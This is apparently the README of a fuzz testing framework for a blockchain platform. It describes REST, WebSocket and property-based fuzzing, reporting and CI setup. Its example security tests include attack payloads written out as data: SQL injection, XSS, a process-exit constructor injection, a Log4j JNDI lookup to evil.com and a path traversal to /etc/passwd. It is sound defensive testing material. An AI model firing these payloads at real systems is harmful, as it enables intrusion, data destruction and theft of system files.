# Wrfcoin Comprehensive Fuzz Testing Framework

A sophisticated multi-layered fuzz testing framework designed specifically for the Wrfcoin
blockchain platform. This framework implements multiple fuzzing approaches to identify security
vulnerabilities, logic flaws, and system weaknesses across REST APIs, WebSocket connections, and
core business logic.

## 🎯 Features

### Multi-Pronged Fuzzing Strategy

- **REST API Fuzzing**: JSON schema-based fuzzing with security-focused mutations
- **WebSocket Fuzzing**: Protocol compliance and message handling validation
- **Property-Based Testing**: Business logic invariant validation using fast-check
- **Continuous Fuzzing**: Orchestrated long-running fuzzing campaigns

### Security-Focused Testing

- SQL injection detection
- Cross-site scripting (XSS) vulnerability identification
- Buffer overflow and denial-of-service testing
- Input validation bypass attempts
- Protocol violation testing

### Comprehensive Reporting

- HTML reports with executive summaries
- JSON reports for integration with CI/CD
- CSV exports for tracking and analysis
- Security-specific reports for compliance
- Risk scoring and vulnerability categorization

## 🏗️ Architecture

```
fuzz-testing/
├── config/
│   └── fuzzing-config.js          # Central configuration
├── fuzzing/
│   ├── rest-api-fuzzer.js          # REST API fuzzing engine
│   ├── websocket-fuzzer.js         # WebSocket fuzzing engine
│   ├── continuous-fuzzer.js        # Orchestration layer
│   └── property-based/
│       └── transaction-properties.test.js  # Property-based tests
├── reporting/
│   └── fuzz-reporter.js            # Multi-format reporting
└── logs/                           # Fuzzing execution logs
```

## 🚀 Quick Start

### Installation

```bash
cd fuzz-testing
npm install
```

### Basic Usage

Run all fuzzing types:

```bash
npm run fuzz:all
```

Run specific fuzzing types:

```bash
npm run fuzz:rest       # REST API fuzzing only
npm run fuzz:websocket  # WebSocket fuzzing only
npm run fuzz:property   # Property-based testing only
```

Continuous fuzzing (long-running):

```bash
npm run fuzz:continuous
```

### Configuration

Edit `config/fuzzing-config.js` to customize:

- API server endpoints and ports
- WebSocket connection parameters
- Fuzzing duration and intensity
- Security test patterns
- Reporting preferences

## 📋 Fuzzing Types

### 1. REST API Fuzzing

**Targets**: All configured API endpoints across multiple servers

- Main API Server (Port 4001)
- Wallet Server (Port 4000)
- Cross-Chain Protocol Server (Port 3000)
- Compute Networks Server (Port 6000)
- Storage Networks Server (Port 7000)

**Test Categories**:

- **Valid Data**: Schema-compliant inputs to test normal operation
- **Boundary Testing**: Edge cases and limit testing
- **Invalid Data**: Schema violations and malformed inputs
- **Security Testing**: Injection attacks and malicious payloads
- **Malformed Requests**: Corrupt JSON and protocol violations

**Example Security Tests**:

```javascript
// SQL Injection
{ "query": "'; DROP TABLE users; --" }

// XSS Attack
{ "comment": "<script>alert('XSS')</script>" }

// Buffer Overflow
{ "data": "A".repeat(100000) }
```

### 2. WebSocket Fuzzing

**Targets**: Real-time communication channels

- Connection establishment and teardown
- Message format validation
- Protocol compliance testing
- Channel subscription/unsubscription

**Test Categories**:

- **Valid Messages**: Proper JSON message formats
- **Malformed JSON**: Syntax errors and incomplete messages
- **Oversized Messages**: Memory exhaustion testing
- **Protocol Violations**: Invalid actions and channels
- **Injection Attacks**: Malicious payload injection
- **Binary Data**: Non-text message handling

**Example WebSocket Tests**:

```javascript
// Protocol violation
{ "action": "invalid_action", "channels": ["global"] }

// Oversized message
{ "action": "subscribe", "data": "A".repeat(1048576) }

// Injection attempt
{ "action": "ping", "data": "{{constructor.constructor('return process')().exit()}}" }
```

### 3. Property-Based Testing

**Targets**: Core business logic and transaction processing

**Properties Tested**:

- **Balance Conservation**: Total supply remains constant (minus fees)
- **Non-negative Balances**: Account balances never go negative
- **Transaction Commutativity**: Independent transactions produce same final state
- **Double Spending Prevention**: Same funds cannot be spent twice
- **Fee Calculation**: Fees are calculated and deducted correctly
- **Precision Preservation**: Decimal amounts maintain precision

**Example Property Test**:

```javascript
// Property: Account balances should never go negative
fc.assert(
  fc.property(
    fc.array(addressArbitrary, { minLength: 2, maxLength: 5 }),
    fc.array(transactionArbitrary, { maxLength: 20 }),
    (addresses, transactions) => {
      // Process all transactions
      for (const tx of transactions) {
        try {
          processor.processTransaction(tx);
        } catch (error) {
          // Invalid transactions should be rejected
        }
      }

      // Verify all balances are non-negative
      for (const address of addresses) {
        expect(processor.getBalance(address)).toBeGreaterThanOrEqual(0);
      }
    }
  ),
  { numRuns: 100 }
);
```

## 📊 Reporting

### Report Types

1. **HTML Report** (`*_report.html`)

   - Executive summary with key metrics
   - Vulnerability details with severity levels
   - Recommendations and next steps
   - Interactive tables and charts

2. **JSON Report** (`*_report.json`)

   - Complete test results and raw data
   - Machine-readable for CI/CD integration
   - Detailed vulnerability information

3. **Security Report** (`*_security.json`)

   - Security-focused vulnerability analysis
   - Risk scoring and compliance impact
   - Remediation recommendations

4. **CSV Summary** (`*_summary.csv`)
   - High-level metrics for tracking
   - Suitable for spreadsheet analysis
   - Historical trending data

### Sample Report Metrics

```json
{
  "summary": {
    "totalRequests": 2500,
    "totalVulnerabilities": 3,
    "totalErrors": 12,
    "successRate": "95.2%",
    "overallRiskScore": 15,
    "riskLevel": "MEDIUM"
  },
  "vulnerabilities": [
    {
      "type": "sql_injection",
      "severity": "high",
      "endpoint": "/api/transactions/create",
      "description": "SQL injection vulnerability in transaction creation"
    }
  ]
}
```

## 🔧 Advanced Configuration

### Custom API Schemas

Define JSON schemas for your endpoints in `config/fuzzing-config.js`:

```javascript
schemas: {
  customEndpoint: {
    type: 'object',
    required: ['field1', 'field2'],
    properties: {
      field1: { type: 'string', maxLength: 100 },
      field2: { type: 'number', minimum: 0, maximum: 1000 }
    }
  }
}
```

### Security Test Patterns

Add custom attack patterns:

```javascript
security: {
  customAttacks: [
    '{{ 7*7 }}', // Template injection
    '${jndi:ldap://evil.com/a}', // Log4j attack
    '../../../etc/passwd', // Path traversal
  ];
}
```

### Fuzzing Intensity

Control test intensity and duration:

```javascript
fuzzing: {
  duration: {
    quick: 60000,      // 1 minute
    standard: 300000,  // 5 minutes
    extended: 1800000, // 30 minutes
    marathon: 7200000  // 2 hours
  },
  requestsPerSecond: {
    low: 1,
    medium: 5,
    high: 10,
    stress: 50
  }
}
```

## 🔒 Security Considerations

### Responsible Testing

- **Environment Isolation**: Only run against test/staging environments
- **Rate Limiting**: Built-in rate limiting to prevent service disruption
- **Data Protection**: No sensitive data should be used in test payloads
- **Permission**: Ensure proper authorization before running tests

### Compliance Integration

The framework supports compliance reporting for:

- **PCI-DSS**: Payment card industry security standards
- **ISO-27001**: Information security management
- **SOX**: Sarbanes-Oxley financial controls

## 🚨 Vulnerability Types Detected

### Critical Severity

- SQL Injection
- Remote Code Execution
- Authentication Bypass
- Privilege Escalation

### High Severity

- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Insecure Direct Object References
- Security Misconfiguration

### Medium Severity

- Information Disclosure
- Denial of Service
- Insufficient Input Validation
- Weak Cryptography

### Low Severity

- Verbose Error Messages
- Missing Security Headers
- Information Leakage

## 📈 Integration with CI/CD

### GitHub Actions Example

```yaml
name: Security Fuzzing
on:
  schedule:
    - cron: '0 2 * * *' # Daily at 2 AM
  workflow_dispatch:

jobs:
  fuzz-testing:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        run: |
          cd fuzz-testing
          npm install
      - name: Run fuzzing tests
        run: |
          cd fuzz-testing
          npm run fuzz:all
      - name: Upload reports
        uses: actions/upload-artifact@v3
        with:
          name: fuzz-reports
          path: fuzz-testing/reports/
```

### Jenkins Pipeline

```groovy
pipeline {
  agent any
  triggers {
    cron('H 2 * * *')  // Daily fuzzing
  }
  stages {
    stage('Fuzz Testing') {
      steps {
        dir('fuzz-testing') {
          sh 'npm install'
          sh 'npm run fuzz:all'
        }
      }
      post {
        always {
          publishHTML([
            allowMissing: false,
            alwaysLinkToLastBuild: true,
            keepAll: true,
            reportDir: 'fuzz-testing/reports',
            reportFiles: '*.html',
            reportName: 'Fuzz Test Report'
          ])
        }
      }
    }
  }
}
```

## 🎛️ Command Line Interface

### Basic Commands

```bash
# Quick 5-minute fuzzing session
node fuzzing/continuous-fuzzer.js --duration 5

# Extended 30-minute session
node fuzzing/continuous-fuzzer.js --duration 30

# Individual fuzzing types
node fuzzing/rest-api-fuzzer.js
node fuzzing/websocket-fuzzer.js

# Property-based testing only
npm test
```

### Environment Variables

```bash
# Set custom API base URLs
export FUZZ_MAIN_API_URL=http://localhost:4001
export FUZZ_WALLET_API_URL=http://localhost:4000

# Set WebSocket URL
export FUZZ_WEBSOCKET_URL=ws://localhost:4002/ws

# Configure logging level
export FUZZ_LOG_LEVEL=debug

# Set output directory
export FUZZ_REPORT_DIR=./custom-reports
```

## 🔍 Troubleshooting

### Common Issues

1. **Connection Refused Errors**

   - Ensure all API servers are running
   - Check port configurations match actual services
   - Verify network connectivity

2. **WebSocket Connection Failures**

   - Confirm WebSocket server is accessible
   - Check for proxy/firewall restrictions
   - Verify WebSocket URL format

3. **High Memory Usage**

   - Reduce fuzzing intensity in configuration
   - Limit payload sizes for testing
   - Monitor system resources during execution

4. **False Positives**
   - Review and customize security test patterns
   - Adjust vulnerability detection thresholds
   - Add environment-specific filtering

### Performance Tuning

```javascript
// Reduce resource usage
fuzzing: {
  requestsPerSecond: { medium: 2 },  // Lower request rate
  maxPayloadSize: 64 * 1024,         // Smaller payloads
  timeouts: { request: 10000 }       // Shorter timeouts
}
```

## 📚 Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Property-Based Testing](https://hypothesis.works/articles/what-is-property-based-testing/)
- [REST API Security Testing](https://owasp.org/www-project-api-security/)
- [WebSocket Security](https://owasp.org/www-community/attacks/WebSocket_hijacking)

## 🤝 Contributing

To contribute improvements to the fuzzing framework:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request with detailed description

## 📄 License

This fuzzing framework is part of the Wrfcoin project and follows the same licensing terms.

---

**⚠️ Security Notice**: This tool is designed for security testing and should only be used against
systems you own or have explicit permission to test. Misuse of this framework against unauthorized
systems may violate laws and regulations.
